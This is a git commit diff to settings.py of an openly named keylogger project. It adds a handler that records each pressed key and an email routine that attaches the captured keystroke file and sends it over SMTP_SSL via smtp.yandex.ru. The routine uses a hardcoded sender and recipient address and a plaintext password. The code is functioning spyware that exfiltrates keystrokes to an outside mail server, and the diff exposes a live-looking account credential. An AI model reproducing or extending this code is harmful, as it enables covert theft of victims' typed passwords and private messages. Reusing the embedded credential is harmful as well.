3c8fdc0f924655fb184aa41ab9a303ecc9c4e916
Victor-Krupeichenko <victor_krupeichenko@hotmail.com>
2023-03-16 19:49:30 +0300

    Добавлен контекстный менеджер для корректного открытия соединения с сервером, а также закрытия этого соединения Добавлена обработка нажатой клавиши (A context manager has been added to correctly open the connection with the server, as well as the closure of this connection Added closed key processing)

--- settings.py
+++ settings.py
@@ -6,7 +6,7 @@ from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 import smtplib
 
-size_my_file = 47
+size_my_file = 47  # размер в байтах
 
 
 def size_file():
@@ -38,19 +38,38 @@ def send_file():
     date = datetime.datetime.now()
     date_time = date.strftime('%d-%m-%Y|%H:%M:%S')
     message = MIMEMultipart()
-    message['From'] = ''
-    message['To'] = ''
+    message['From'] = 'klloger@yandex.ru'
+    message['To'] = 'klloger@yandex.ru'
     message['Subject'] = f'Keylloger {date_time}'
     file_name = 'keylloger_file.txt'
     attachment = open(file_name, 'rb')
     part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
+    part.set_payload(attachment.read())
     encoders.encode_base64(part)
     part.add_header('Content-Disposition', "attachment; filename= %s" % file_name)
     message.attach(part)
-    server = smtplib.SMTP_SSL('smtp.yandex.ru', 465)
-    server.ehlo('')
-    server.login('', '')
-    server.auth_plain()
-    server.send_message(message)
-    server.quit()
+    with smtplib.SMTP_SSL('smtp.yandex.ru', 465) as server:
+        server.ehlo('klloger@yandex.ru')
+        server.login('klloger@yandex.ru', '19vic19tor86')
+        server.auth_plain()
+        result = server.send_message(message)
+        if result is None:
+            return 'yes'
+        else:
+            return 'no'
+
+
+def pressing_key(event, key_dictionary, language_flag, add_char):
+    """Обработка нажатой клавиши"""
+    if language_flag:
+        try:
+            print(event.name)
+            add_char.append(event.name)
+        except (TypeError, AttributeError):
+            pass
+    else:
+        try:
+            print(key_dictionary[event.name])
+            add_char.append(key_dictionary[event.name])
+        except KeyError:
+            pass
